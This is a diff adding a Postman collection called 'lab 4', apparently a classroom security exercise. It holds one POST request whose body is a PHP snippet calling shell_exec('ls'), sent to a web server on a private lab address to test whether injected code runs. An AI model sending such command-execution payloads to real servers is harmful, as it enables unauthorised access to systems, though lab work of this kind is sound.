@@ -1,0 +1,47 @@
+{
+	"info": {
+		"_postman_id": "efeb02ea-5934-437f-b8c8-74b8a043cf29",
+		"name": "lab 4",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "30346489"
+	},
+	"item": [
+		{
+			"name": "http://192.168.0.11:8080/index.html",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"exec": [
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "<?php\r\n\r\n$salida = shell_exec('ls');\r\necho \"<pre>$salida</pre>\";\r\n\r\n?>\r\n"
+				},
+				"url": {
+					"raw": "http://192.168.0.11:8080/index.html",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"0",
+						"11"
+					],
+					"port": "8080",
+					"path": [
+						"index.html"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
